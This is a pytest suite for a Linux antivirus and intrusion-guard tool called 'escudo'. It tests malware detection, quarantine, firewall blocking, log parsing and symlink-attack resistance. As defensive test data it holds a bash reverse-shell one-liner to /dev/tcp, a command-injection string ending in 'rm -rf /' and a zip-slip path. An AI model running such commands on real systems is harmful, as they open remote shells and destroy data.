import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from escudo.config import Config  # noqa: E402
from escudo.firewall import Firewall  # noqa: E402
from escudo.netguard import NetGuard, extract_attacker_ip  # noqa: E402
from escudo.quarantine import Quarantine  # noqa: E402
from escudo.scanner import Scanner  # noqa: E402
from escudo.signatures import EICAR  # noqa: E402


def cfg(tmp_path):
    return Config(data_dir=tmp_path / "data", exclude_dirs=[], dry_run_firewall=True)


def test_eicar_detected_and_quarantined(tmp_path):
    c = cfg(tmp_path)
    f = tmp_path / "eicar.com"
    f.write_bytes(EICAR)
    dets = Scanner(c).scan_file(str(f))
    assert dets and dets[0].name == "EICAR-Test-File" and dets[0].method == "hash"
    q = Quarantine(c.quarantine_dir)
    qid = q.add(str(f), dets[0].name)
    assert not f.exists() and EICAR not in (c.quarantine_dir / f"{qid}.bin").read_bytes()
    q.restore(qid)
    assert f.read_bytes() == EICAR


def test_heuristics_double_extension_and_reverse_shell(tmp_path):
    c = cfg(tmp_path)
    (tmp_path / "factura.pdf.exe").write_bytes(b"MZ" + b"\0" * 100)
    (tmp_path / "x.sh").write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    names = {d.name for d in Scanner(c).scan(str(tmp_path)).detections}
    assert {"Heur.DoubleExtension", "Linux.ReverseShell.DevTcp"} <= names


def test_bruteforce_blocks_ip(tmp_path):
    c = cfg(tmp_path)
    g = NetGuard(c, Firewall(c))
    line = "Failed password for root from 203.0.113.7 port 2222 ssh2"
    assert extract_attacker_ip(line) == "203.0.113.7"
    for _ in range(c.bruteforce_threshold):
        g.process_log_line(line)
    assert "203.0.113.7" in g.fw.blocked


def test_whitelist_and_injection_safe(tmp_path):
    c = cfg(tmp_path)
    fw = Firewall(c)
    assert fw.block("127.0.0.1") is False
    try:
        fw.block("1.2.3.4; rm -rf /")
        raise AssertionError("debería rechazar la IP")
    except ValueError:
        pass


def test_ml_layer_is_low_alone_and_high_when_corroborated(tmp_path, monkeypatch):
    from escudo import ml
    c = cfg(tmp_path)
    sc = Scanner(c)
    sc.ml.libs_ok = True
    monkeypatch.setattr(sc.ml, "score", lambda data: ("PE", 0.995))
    exe = tmp_path / "app.exe"
    exe.write_bytes(b"MZ" + b"\0" * 200)
    dets = sc.scan_file(str(exe))
    assert [d.severity for d in dets if d.method == "ml"] == ["low"]           # solo: no cuarentena
    bad = tmp_path / "factura.pdf.exe"
    bad.write_bytes(b"MZ" + b"\0" * 200)
    dets = sc.scan_file(str(bad))
    assert any(d.method == "ml" and d.severity == "high" for d in dets)        # corroborado por heurística
    assert ml.file_kind(b"\x7fELF....") == "ELF" and ml.file_kind(b"%PDF-1.7") == "PDF"


def test_model_hash_mismatch_is_refused(tmp_path):
    from escudo import ml
    d = tmp_path / "modelos"
    d.mkdir()
    (d / ml.MODELS["PE"][0]).write_bytes(b"modelo manipulado")
    eng = ml.MLEngine(d)
    eng.libs_ok = True
    import sys, types
    sys.modules.setdefault("lightgbm", types.SimpleNamespace(Booster=lambda **k: object()))
    assert eng._booster("PE") is None


def test_yara_zip_slip_and_compile_gate(tmp_path, monkeypatch):
    import io, zipfile
    from escudo.yara_engine import YaraEngine
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("../../escape.yar", "rule a { condition: true }")
        z.writestr("ok/regla.yar", "rule b { condition: true }")
    payload = buf.getvalue()

    class R:
        def __init__(self, d): self.d = io.BytesIO(d)
        def read(self, n=-1): return self.d.read(n)
        def __enter__(self): return self
        def __exit__(self, *a): pass
    monkeypatch.setattr("urllib.request.urlopen", lambda *a, **k: R(payload))
    eng = YaraEngine(tmp_path / "data" / "yara")
    (tmp_path / "data").mkdir()
    eng.yara = None                       # sin la librería no se compila, pero se instala igual
    assert eng.update() == 2
    assert not (tmp_path / "escape.yar").exists() and (tmp_path / "data/yara/escape.yar").exists()


def test_A4_symlink_swap_does_not_delete_victim(tmp_path):
    """Ataque de la auditoría: tras el escaneo, la carpeta se cambia por un enlace a la víctima."""
    c = cfg(tmp_path)
    attacker = tmp_path / "atacante" / "a"
    attacker.mkdir(parents=True)
    victim = tmp_path / "victima" / ".ssh"
    victim.mkdir(parents=True)
    (victim / "authorized_keys").write_text("clave de la víctima")
    f = attacker / "authorized_keys"
    f.write_bytes(EICAR)
    det = Scanner(c).scan_file(str(f))[0]
    f.unlink()
    attacker.rmdir()
    attacker.symlink_to(victim)                      # el cambio malicioso
    import pytest
    with pytest.raises(OSError):
        Quarantine(c.quarantine_dir).add(det.path, det.name, expected=det.ident)
    assert (victim / "authorized_keys").read_text() == "clave de la víctima"


def test_M1_restore_does_not_follow_symlinks(tmp_path):
    c = cfg(tmp_path)
    d = tmp_path / "dir"
    d.mkdir()
    f = d / "x.desktop"
    f.write_bytes(EICAR)
    q = Quarantine(c.quarantine_dir)
    qid = q.add(str(f), "EICAR")
    d.rmdir()
    target = tmp_path / "autostart_victima"
    target.mkdir()
    d.symlink_to(target)
    import pytest
    with pytest.raises(OSError):
        q.restore(qid)
    assert not (target / "x.desktop").exists()


def test_quarantine_quota(tmp_path):
    c = cfg(tmp_path)
    q = Quarantine(c.quarantine_dir, max_total=10)
    f = tmp_path / "e.com"
    f.write_bytes(EICAR)
    import pytest
    with pytest.raises(OSError):
        q.add(str(f), "EICAR")
    assert f.exists()


def test_scan_does_not_follow_symlinks(tmp_path):
    c = cfg(tmp_path)
    real = tmp_path / "real.com"
    real.write_bytes(EICAR)
    link = tmp_path / "link.com"
    link.symlink_to(real)
    import pytest
    with pytest.raises(OSError):
        Scanner(c).scan_file(str(link))


def test_M2_username_injection_blocks_the_real_ip():
    inj = "Failed password for invalid user a from 192.168.1.1 port 1 ssh2 from 203.0.113.5 port 5555 ssh2"
    assert extract_attacker_ip(inj) == "203.0.113.5"


def test_M2_forged_syslog_line_ignored():
    from escudo.netguard import message_from_syslog
    # «logger -t sshd» desde un usuario: el PID no es un sshd real
    assert message_from_syslog("Nov 11 host sshd[999999]: Failed password for x from 10.0.0.1 port 1 ssh2") is None


def test_M3_outgoing_connections_ignored(monkeypatch, tmp_path):
    from escudo import netguard
    # puerto local 50000 (efímero, saliente) ESTABLISHED; puerto 22 en escucha
    tcp = ("  sl  local_address rem_address   st\n"
           "   0: 00000000:0016 00000000:0000 0A\n"
           "   1: 0100007F:C350 0500A8C0:01BB 01\n"
           "   2: 0100007F:0016 0700A8C0:D431 01\n")
    real = netguard.Path

    class FakePath(type(real())):
        pass

    def fake_read(self, *a, **k):
        return tcp if str(self) == "/proc/net/tcp" else ""
    monkeypatch.setattr(netguard.Path, "read_text", fake_read)
    conns = netguard._proc_net_connections()
    assert conns == [("192.168.0.7", 22, "ESTABLISHED")]


def test_realtime_worker_sleeps_until_work_and_still_scans(tmp_path):
    """El hilo no se despierta sin trabajo, pero un archivo nuevo se analiza en ~1 s."""
    import threading
    import time as _t

    from escudo import monitor
    seen = []

    class FakeScanner:
        def _excluded(self, p):
            return False

        def scan_file(self, p):
            seen.append(p)
            return []
    rtp = monitor.RealTimeProtection(FakeScanner(), quarantine=None)
    th = threading.Thread(target=rtp._worker, daemon=True)
    th.start()
    _t.sleep(0.3)
    assert not rtp._wake.is_set() and seen == []
    f = tmp_path / "nuevo.bin"
    f.write_bytes(b"x")
    rtp._enqueue(str(f))
    for _ in range(40):
        if seen:
            break
        _t.sleep(0.1)
    assert seen == [str(f)]
    rtp.stop()
    th.join(2)
    assert not th.is_alive()


def test_fanotify_watcher_on_real_mount(tmp_path):
    """Con root: un tmpfs montado, una sola marca; carpetas nuevas y descargas renombradas se analizan."""
    import os as _os
    import subprocess as _sp
    import time as _t

    import pytest as _pytest

    from escudo import monitor
    mnt = tmp_path / "mnt"
    mnt.mkdir()
    if _os.geteuid() != 0 or _sp.run(["mount", "-t", "tmpfs", "tmpfs", str(mnt)], capture_output=True).returncode:
        _pytest.skip("requiere root y poder montar tmpfs")
    seen = []

    class S:
        def _excluded(self, p):
            return "/.cache/" in p

        def scan_file(self, p):
            seen.append(_os.path.relpath(p, mnt))
            return []
    rtp = monitor.RealTimeProtection(S(), quarantine=None)
    try:
        rtp.start([str(mnt)])
        assert rtp._fan.covered == [str(mnt)]
        (mnt / "a/b/c").mkdir(parents=True)
        (mnt / "a/b/c/hondo.bin").write_bytes(b"x")
        (mnt / "Unconfirmed 1.crdownload").write_bytes(b"y")
        _os.rename(mnt / "Unconfirmed 1.crdownload", mnt / "programa.exe")
        (mnt / ".cache").mkdir()
        (mnt / ".cache/c.bin").write_bytes(b"z")
        for _ in range(40):
            if len(seen) >= 2:
                break
            _t.sleep(0.1)
        _t.sleep(0.3)
        assert sorted(seen) == ["a/b/c/hondo.bin", "programa.exe"]
    finally:
        rtp.stop()
        _sp.run(["umount", str(mnt)])


def test_follow_wakes_on_change_and_survives_rotation(tmp_path):
    import threading
    import time as _t

    from escudo import behavior
    log_ = tmp_path / "audit.log"
    log_.write_text("viejo\n")
    stop = threading.Event()
    got = []

    def run():
        for line in behavior.follow(str(log_), stop, timeout=5):
            got.append(line.strip())
    th = threading.Thread(target=run, daemon=True)
    th.start()
    _t.sleep(0.3)
    with open(log_, "a") as f:
        f.write("uno\n")
    _t.sleep(0.5)
    log_.rename(tmp_path / "audit.log.1")                 # rotación
    log_.write_text("dos\n")
    for _ in range(30):
        if len(got) >= 2:
            break
        _t.sleep(0.1)
    stop.set()
    assert got == ["uno", "dos"]
